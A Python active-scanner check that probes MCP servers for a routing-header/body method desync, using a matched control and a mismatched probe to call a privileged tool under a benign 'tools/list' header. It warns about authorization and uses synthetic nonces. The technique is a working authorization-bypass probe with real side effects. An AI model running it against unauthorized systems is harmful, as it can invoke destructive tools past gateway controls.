#!/usr/bin/env python3
# @id: mcp-method-desync
# @name: MCP Routing-Header / Body Method Desync (Gateway Authz Bypass)
# @author: Bugb Research
# @severity: high
# @description: ACTIVE check. The MCP 2026-07-28 stateless-core adds Mcp-Method / Mcp-Name request headers so a gateway can authorize a call WITHOUT parsing the JSON body. This proves, by observation, that a server dispatches on the BODY while the header claimed a different, benign method - so a gateway that trusted the header is bypassable. Sends a matched control (header and body agree) then a mismatched probe (header says tools/list, body calls a privileged tools/call). Server honours the body under the benign header => request smuggling / authz bypass.
# @tags: mcp, ai, agent, request-smuggling, gateway, authz-bypass, desync, routing-header, behavioural, active, http, cwe-444, cwe-863
# @cwe: CWE-444, CWE-863
# @cvss: 8.1
# @target_kinds: http
# @oracles: property
# @references: https://modelcontextprotocol.io/specification/2026-07-28/basic/transports, https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices, https://cwe.mitre.org/data/definitions/444.html, https://cwe.mitre.org/data/definitions/863.html
# @confidence: 95
# @version: 1.0.0
"""
ACTIVE / INTRUSIVE check - MCP routing-header / body method desync.

THE SURFACE THIS TESTS IS FIVE WEEKS OLD

The MCP 2026-07-28 revision adds two request headers to the streamable-HTTP
transport - `Mcp-Method` and `Mcp-Name` - so that an intermediary (a gateway,
an authorizing proxy, an egress filter) can route and AUTHORIZE a call without
having to parse the JSON-RPC body:

    Mcp-Method: tools/call
    Mcp-Name:   delete_workspace

    {"jsonrpc":"2.0","id":7,"method":"tools/call",
     "params":{"name":"delete_workspace", ...}}

The headers exist to let the gateway decide "is this caller allowed to invoke
tools/call on delete_workspace?" cheaply, at the edge, before the body ever
reaches the origin server. That only works if the header and the body cannot
disagree. The spec therefore requires the origin server to treat a request
whose header and body name different methods as malformed and reject it.

THE DESYNC

If the gateway authorizes on the HEADER and the origin server dispatches on the
BODY, and the origin does not enforce that the two agree, then:

    Mcp-Method: tools/list            <- gateway sees a harmless listing,
                                          allows it (tools/list is usually
                                          unauthenticated / low-privilege)

    {"method":"tools/call",           <- origin runs a privileged call
     "params":{"name":"delete_workspace"}}

is a request the gateway believed was `tools/list` and the server executed as
`tools/call`. This is HTTP request smuggling (CWE-444) applied to MCP's brand
new routing headers, and the payoff is an authorization bypass (CWE-863):
header-based authz is worth exactly nothing.

THE ORACLE IS A PROPERTY OF TWO OBSERVED CALLS TO ONE SERVER

  Property:  a server on the routing-header surface executes the method named
             in the BODY only when the `Mcp-Method` header names the same
             method. Executing the body's method while the header named a
             different, benign one breaks it.

One observation cannot express this - it takes a matched CONTROL and a
mismatched PROBE against the same server, which is why this is a `property`
oracle and not a YAML rule:

  CONTROL (header and body AGREE)
      Mcp-Method: tools/call, Mcp-Name: <privileged tool>
      body: tools/call <privileged tool> {token: <nonce_c>}
    -> establishes that the privileged tool executes and how a body-honoured
       response looks (it echoes nonce_c, or it carries a tools/call result).
       Without this, a quiet PROBE could not be told from an inert tool.

  PROBE (header and body DISAGREE)
      Mcp-Method: tools/list        <- the benign method a gateway would allow
      body: tools/call <privileged tool> {token: <nonce_p>}
    -> the same privileged body, now under a header that claims a harmless
       listing.

VERDICT CONTRACT

  confirmed  the PROBE executed the body's privileged tools/call while the
             header said tools/list - the response echoed the probe's own
             nonce, or (for a tool that does not echo) carried a tools/call
             result where the CONTROL proved a body-honoured call does. The
             gateway that authorized this as tools/list was bypassed. The
             observation is in the evidence.
  refuted    the server did NOT honour the mismatched body: it either routed
             on the header (returned a tools/list result) or rejected the
             mismatch outright (an error / 4xx) - AND the matched control DID
             execute, so "quiet" means "rejected the desync", not "inert tool".
  skipped    a precondition was not met, and which one is named:
               - no MCP server answered;
               - the server exposes no tool a body could smuggle;
               - the server PREDATES the routing-header surface: a request
                 routed by the `Mcp-Method` header alone (no method in the
                 body) is not honoured, so there is no header for a gateway to
                 trust and this desync class does not apply. This SKIP doubles
                 as a 2026-07-28 stateless-core spec-version fingerprint.
  errored    the target could not be reached, or the matched control did not
             execute so the oracle has no baseline to judge the probe against.

SAFETY

It is ACTIVE: it invokes `tools/call`. Every argument it sends is an obviously
synthetic nonce (`token: cxg-desync-<hex>`); it never sends real data. To prove
a *method-level* desync it must invoke whatever tool the server presents as
privileged, so against a real server that tool's side effects are real - point
this only at a system you are authorized to test, and run an untrusted server
inside a disposable container. Against the fixture in
fixtures/mcp-method-desync the privileged tool is a benign decoy that writes a
single synthetic marker file and echoes the nonce; nothing there is real or
destructive.
"""

import json
import os
import re
import ssl
import sys
import urllib.error
import urllib.request
import uuid
from datetime import datetime, timezone
from pathlib import Path

METADATA = {
    "id": "mcp-method-desync",
    "name": "MCP Routing-Header / Body Method Desync (Gateway Authz Bypass)",
    "author": {"name": "Bugb Research", "email": "research@bugb.io"},
    "severity": "high",
    "description": (
        "ACTIVE check: proves an MCP server dispatches on the JSON-RPC body while the 2026-07-28 "
        "Mcp-Method routing header claimed a different, benign method - so a gateway that authorized "
        "on the header is bypassable (request smuggling -> authz bypass)"
    ),
    "tags": ["mcp", "ai", "agent", "request-smuggling", "gateway", "authz-bypass", "desync",
             "routing-header", "behavioural", "active", "http", "cwe-444", "cwe-863"],
    "language": "python",
    "active": True,
    "confidence": 95,
    "cwe": ["CWE-444", "CWE-863"],
    "references": [
        "https://modelcontextprotocol.io/specification/2026-07-28/basic/transports",
        "https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices",
        "https://cwe.mitre.org/data/definitions/444.html",
        "https://cwe.mitre.org/data/definitions/863.html",
    ],
}

MCP_PATHS = ["/mcp", "/", "/rpc"]
PROTO_VERSION = "2026-07-28"
NONCE_PREFIX = "cxg-desync"
# The benign method a gateway would wave through: listing is low-privilege and
# frequently allowed unauthenticated.
BENIGN_METHOD = "tools/list"
PRIVILEGED_METHOD = "tools/call"

# What the server presents as privileged - the tool a gateway's Mcp-Name authz
# would guard. Behavioural signal first (annotations), then the name/description.
WRITE_VERB_RE = re.compile(
    r"\b(writ\w*|creat\w*|delet\w*|remov\w*|updat\w*|modif\w*|sav\w*|append\w*|put|patch|"
    r"upload\w*|renam\w*|mov\w*|mkdir|install\w*|execut\w*|exec|run|spawn\w*|kill|send\w*|"
    r"post|publish\w*|commit\w*|push\w*|drop|truncat\w*|purg\w*|reset|admin|grant|revoke)\b", re.I)


# ---------------------------------------------------------------------------
# HTTP transport with per-request header injection. The routing headers are the
# whole point, so unlike an ordinary MCP client this one lets a caller override
# Mcp-Method / Mcp-Name independently of the body it sends.
# ---------------------------------------------------------------------------

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    return c


def _extract_json(body):
    body = (body or "").strip()
    if not body:
        return None
    if "data:" in body:
        for line in body.splitlines():
            line = line.strip()
            if line.startswith("data:"):
                try:
                    return json.loads(line[5:].strip())
                except ValueError:
                    continue
    try:
        return json.loads(body)
    except ValueError:
        return None


class HttpMcp(object):
    def __init__(self, base, timeout=12):
        self.base = base
        self.timeout = timeout
        self.path = None
        self.session_id = None
        self._id = 0

    def _next_id(self):
        self._id += 1
        return self._id

    def _post(self, url, payload, extra_headers=None):
        headers = {"Content-Type": "application/json",
                   "Accept": "application/json, text/event-stream"}
        if self.session_id:
            headers["mcp-session-id"] = self.session_id
        if extra_headers:
            for k, v in extra_headers.items():
                if v is None:
                    headers.pop(k, None)
                else:
                    headers[k] = v
        req = urllib.request.Request(url, data=json.dumps(payload).encode(),
                                     headers=headers, method="POST")
        try:
            r = urllib.request.urlopen(req, timeout=self.timeout, context=_ctx())
            return r.status, {k.lower(): v for k, v in r.headers.items()}, r.read().decode("utf-8", "ignore")
        except urllib.error.HTTPError as e:
            try:
                body = e.read().decode("utf-8", "ignore")
            except Exception:
                body = ""
            return e.code, {k.lower(): v for k, v in (e.headers or {}).items()}, body
        except Exception:
            return None, {}, ""

    def open(self):
        payload = {"jsonrpc": "2.0", "id": self._next_id(), "method": "initialize",
                   "params": {"protocolVersion": PROTO_VERSION, "capabilities": {},
                              "clientInfo": {"name": "cxg", "version": "1.0"}}}
        for path in MCP_PATHS:
            status, headers, body = self._post(self.base + path, payload)
            if status != 200:
                continue
            obj = _extract_json(body)
            if not isinstance(obj, dict) or "result" not in obj:
                continue
            self.path = path
            self.session_id = headers.get("mcp-session-id")
            self._post(self.base + path, {"jsonrpc": "2.0", "method": "notifications/initialized"})
            return obj.get("result") or {}
        return None

    def call(self, method, params, extra_headers=None, omit_body_method=False):
        """Send one JSON-RPC request. `extra_headers` overrides routing headers;
        `omit_body_method` drops `method` from the body entirely so the request
        can only be routed by the header - the stateless-core fingerprint."""
        if self.path is None:
            return None, {}, None
        payload = {"jsonrpc": "2.0", "id": self._next_id()}
        if not omit_body_method:
            payload["method"] = method
        if params is not None:
            payload["params"] = params
        status, headers, body = self._post(self.base + self.path, payload, extra_headers)
        return status, headers, _extract_json(body)

    def endpoint(self):
        return self.base + (self.path or "")


# ---------------------------------------------------------------------------
# Reading one response.
# ---------------------------------------------------------------------------

def result_text(resp):
    if not isinstance(resp, dict):
        return ""
    if resp.get("error") is not None:
        err = resp["error"]
        return err if isinstance(err, str) else json.dumps(err)
    result = resp.get("result")
    if not isinstance(result, dict):
        return json.dumps(result) if result is not None else ""
    chunks = []
    for item in result.get("content") or []:
        if isinstance(item, dict):
            chunks.append(str(item.get("text") or item.get("data") or ""))
        else:
            chunks.append(str(item))
    if not chunks:
        chunks.append(json.dumps(result))
    return "\n".join(c for c in chunks if c)


def classify(status, resp):
    """How did the server treat this request? One of:
        'call-result'  a tools/call answer (has content / isError, no tools[])
        'list-result'  a tools/list answer (result.tools is a list)
        'error'        JSON-RPC error, or an HTTP status the server rejected with
        'none'         nothing parseable
    """
    if status is not None and status >= 400:
        return "error"
    if not isinstance(resp, dict):
        return "none"
    if resp.get("error") is not None:
        return "error"
    result = resp.get("result")
    if not isinstance(result, dict):
        return "none"
    if isinstance(result.get("tools"), list):
        return "list-result"
    if "content" in result or "isError" in result:
        return "call-result"
    return "none"


def pick_privileged(tools):
    """The tool a gateway's Mcp-Name authz would guard. Prefer a declared
    state-changer; fall back to any tool the body can smuggle."""
    scored = []
    for t in tools:
        if not isinstance(t, dict) or not t.get("name"):
            continue
        ann = t.get("annotations") if isinstance(t.get("annotations"), dict) else {}
        text = "%s %s" % (str(t.get("name")).replace("_", " "), str(t.get("description") or ""))
        if ann.get("destructiveHint") is True:
            score = 3
        elif ann.get("readOnlyHint") is False:
            score = 2
        elif WRITE_VERB_RE.search(text):
            score = 2
        else:
            score = 1
        scored.append((score, t))
    if not scored:
        return None
    scored.sort(key=lambda s: s[0], reverse=True)
    return scored[0][1]


# ---------------------------------------------------------------------------
# Emission.
# ---------------------------------------------------------------------------

def emit(status, detail, findings=None):
    meta = dict(METADATA)
    meta["status"] = status
    meta["detail"] = detail
    print(json.dumps({"findings": findings or [], "metadata": meta}, indent=2))


def make_finding(target, request_desc, description, evidence, matched):
    return {
        "target": target,
        "template_id": METADATA["id"],
        "severity": METADATA["severity"],
        "confidence": METADATA["confidence"],
        "title": METADATA["name"],
        "description": description,
        "evidence": {
            "request": request_desc,
            "response": json.dumps(evidence)[:1400],
            "matched_patterns": matched,
            "data": evidence,
        },
        "cwe_ids": METADATA["cwe"],
        "tags": METADATA["tags"],
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


# ---------------------------------------------------------------------------
# The scan.
# ---------------------------------------------------------------------------

def smuggle(session, header_method, header_name, body_name, token):
    """One tools/call in the body under a chosen Mcp-Method / Mcp-Name header."""
    extra = {"Mcp-Method": header_method}
    extra["Mcp-Name"] = header_name  # None => header not sent
    params = {"name": body_name, "arguments": {"token": token}}
    return session.call(PRIVILEGED_METHOD, params, extra_headers=extra)


def scan_http(host, port, scheme="http", timeout=12):
    base = "%s://%s:%d" % (scheme, host, port)
    session = HttpMcp(base, timeout)
    info = session.open()
    if info is None:
        return "skipped", "no-mcp-server-answered(%s)" % base, []
    endpoint = session.endpoint()
    server_name = (info.get("serverInfo") or {}).get("name")

    # Enumerate tools and choose the one a gateway would guard.
    _s, _h, tl = session.call("tools/list", {})
    tools = ((tl or {}).get("result") or {}).get("tools") if isinstance(tl, dict) else None
    if not isinstance(tools, list) or not tools:
        return "skipped", "server-exposes-no-tool-to-smuggle endpoint=%s" % endpoint, []
    priv = pick_privileged(tools)
    if priv is None:
        return "skipped", "server-exposes-no-tool-to-smuggle endpoint=%s" % endpoint, []
    priv_name = str(priv.get("name"))

    # Spec-version fingerprint: is this the 2026-07-28 routing-header surface at
    # all? A request routed by the Mcp-Method header alone - no method in the
    # body - is only honoured by a server that reads the header. If it is not
    # honoured there is no header for a gateway to trust, and this desync class
    # does not apply.
    fs, _fh, fresp = session.call(BENIGN_METHOD, {}, extra_headers={"Mcp-Method": BENIGN_METHOD},
                                  omit_body_method=True)
    if classify(fs, fresp) != "list-result":
        return ("skipped",
                "server-predates-routing-header-surface(a request routed by the Mcp-Method header "
                "alone was not honoured: got '%s'; no 2026-07-28 stateless-core header for a gateway "
                "to trust) endpoint=%s" % (classify(fs, fresp), endpoint), [])

    # CONTROL: header and body AGREE. Establishes that the privileged tool
    # executes, and what a body-honoured answer looks like (nonce echo / shape).
    nonce_c = "%s-%s" % (NONCE_PREFIX, uuid.uuid4().hex[:12])
    cs, _ch, cresp = smuggle(session, PRIVILEGED_METHOD, priv_name, priv_name, nonce_c)
    c_shape = classify(cs, cresp)
    c_text = result_text(cresp)
    c_echoes = nonce_c in c_text
    c_executed = c_echoes or c_shape == "call-result"
    if not c_executed:
        return ("errored",
                "matched-control-did-not-execute(header and body both %s on %s -> '%s'); without a "
                "baseline the probe cannot be judged endpoint=%s"
                % (PRIVILEGED_METHOD, priv_name, c_shape, endpoint), [])

    # PROBE: header and body DISAGREE. Body still calls the privileged tool; the
    # header now claims the benign listing a gateway would allow. No Mcp-Name is
    # sent (a listing has no tool name) - exactly what an attacker slipping past
    # a header-authorizing gateway would send.
    nonce_p = "%s-%s" % (NONCE_PREFIX, uuid.uuid4().hex[:12])
    ps, _ph, presp = smuggle(session, BENIGN_METHOD, None, priv_name, nonce_p)
    p_shape = classify(ps, presp)
    p_text = result_text(presp)
    p_echoes = nonce_p in p_text
    # If the control proved the tool echoes its nonce, the nonce is the gold
    # signal; otherwise fall back to the response shape the control established.
    if c_echoes:
        probe_executed = p_echoes
        signal = "nonce-echo"
    else:
        probe_executed = p_shape == "call-result"
        signal = "response-shape"

    surface = ("transport=streamable-http endpoint=%s server=%s privileged_tool=%s benign_header=%s "
               "signal=%s" % (endpoint, server_name, priv_name, BENIGN_METHOD, signal))

    if not probe_executed:
        # Why did it stay quiet? Name it, so the refutation is honest.
        if p_shape == "list-result":
            why = "server routed on the header (returned a %s result), ignoring the body's %s" % (
                BENIGN_METHOD, PRIVILEGED_METHOD)
        elif p_shape == "error":
            why = "server rejected the header/body method mismatch (%s)" % (
                json.dumps(presp.get("error"))[:160] if isinstance(presp, dict) and presp.get("error")
                else "status=%s" % ps)
        else:
            why = "server did not honour the mismatched body (shape=%s)" % p_shape
        detail = ("no-desync(control-executed:%s; probe-quiet: %s) | %s"
                  % ("nonce" if c_echoes else c_shape, why, surface))
        return "refuted", detail, []

    # CONFIRMED.
    evidence = {
        "endpoint": endpoint,
        "server_name": server_name,
        "privileged_tool": priv_name,
        "privileged_tool_annotations": priv.get("annotations"),
        "control": {
            "sent_header_method": PRIVILEGED_METHOD, "sent_header_name": priv_name,
            "sent_body_method": PRIVILEGED_METHOD, "sent_body_name": priv_name,
            "nonce": nonce_c, "response_shape": c_shape, "nonce_echoed": c_echoes,
            "excerpt": c_text[:300],
        },
        "probe": {
            "sent_header_method": BENIGN_METHOD, "sent_header_name": None,
            "sent_body_method": PRIVILEGED_METHOD, "sent_body_name": priv_name,
            "nonce": nonce_p, "response_shape": p_shape, "nonce_echoed": p_echoes,
            "excerpt": p_text[:300],
        },
        "signal": signal,
    }
    description = (
        "MCP server %s at %s executed a privileged %s on tool '%s' that was carried in the JSON-RPC "
        "BODY while the request's Mcp-Method routing header claimed '%s'. A matched control (header "
        "and body both %s) established the tool executes; the probe then sent the same privileged body "
        "under the benign header and the server honoured the body anyway (%s: %s). Under the 2026-07-28 "
        "stateless-core, the Mcp-Method / Mcp-Name headers exist so a gateway can authorize a call "
        "without parsing the body - a gateway that saw '%s' here would have allowed this as a harmless "
        "listing while the server ran the privileged call. Header-based authorization is bypassable: "
        "this is request smuggling (CWE-444) yielding an authorization bypass (CWE-863)."
        % (server_name, endpoint, PRIVILEGED_METHOD, priv_name, BENIGN_METHOD, PRIVILEGED_METHOD,
           signal, ("probe echoed its own nonce %s" % nonce_p) if signal == "nonce-echo"
           else "probe returned a tools/call result where the control proved a body-honoured call does",
           BENIGN_METHOD))
    finding = make_finding(
        endpoint,
        "control: Mcp-Method=%s + body %s (agree) ; probe: Mcp-Method=%s + body %s (disagree)"
        % (PRIVILEGED_METHOD, PRIVILEGED_METHOD, BENIGN_METHOD, PRIVILEGED_METHOD),
        description, evidence,
        ["header-body-method-mismatch", "body-honoured-under-benign-header",
         "matched-control-executed", signal])
    detail = ("desync-proven(privileged_tool=%s executed under Mcp-Method:%s; %s) | %s"
              % (priv_name, BENIGN_METHOD, signal, surface))
    return "confirmed", detail, [finding]


# ---------------------------------------------------------------------------
# Target resolution.
# ---------------------------------------------------------------------------

def resolve_target():
    """Returns ('http', host, port, scheme) or ('skip', why) or ('error', why)."""
    if os.getenv("CERT_X_GEN_MODE") == "engine":
        host = os.getenv("CERT_X_GEN_TARGET_HOST") or ""
        kind = (os.getenv("CERT_X_GEN_TARGET_KIND") or "").lower()
        if not host:
            return ("error", "CERT_X_GEN_TARGET_HOST not set")
        if host.startswith("cli://") or kind == "cli" or (host.startswith("/") and Path(host).is_file()):
            return ("skip", "routing-header desync is an HTTP-transport property; the Mcp-Method / "
                            "Mcp-Name headers do not exist on the stdio/cli transport")
        scheme = os.getenv("CERT_X_GEN_TARGET_PROTOCOL", "http")
        host = re.sub(r"^https?://", "", host).split("/")[0]
        try:
            port = int(os.getenv("CERT_X_GEN_TARGET_PORT", "8000"))
        except ValueError:
            port = 8000
        return ("http", host, port, scheme)

    args = sys.argv[1:]
    if not args:
        return ("error", "Usage: mcp-method-desync.py <host> [port] [scheme]")
    host = args[0]
    port = int(args[1]) if len(args) > 1 else 8000
    scheme = args[2] if len(args) > 2 else "http"
    return ("http", host, port, scheme)


def main():
    sys.stderr.write(
        "[!] mcp-method-desync is an ACTIVE check: it INVOKES tools/call (with synthetic nonce "
        "arguments only) to observe whether the server dispatches on the body while a benign "
        "Mcp-Method header claims otherwise. Make sure you are authorized to test this system.\n")
    sys.stderr.flush()

    target = resolve_target()
    if target[0] == "error":
        emit("errored", target[1])
        sys.exit(0)
    if target[0] == "skip":
        emit("skipped", target[1])
        sys.exit(0)
    _kind, host, port, scheme = target
    status, detail, findings = scan_http(host, port, scheme)
    emit(status, detail, findings)


if __name__ == "__main__":
    main()
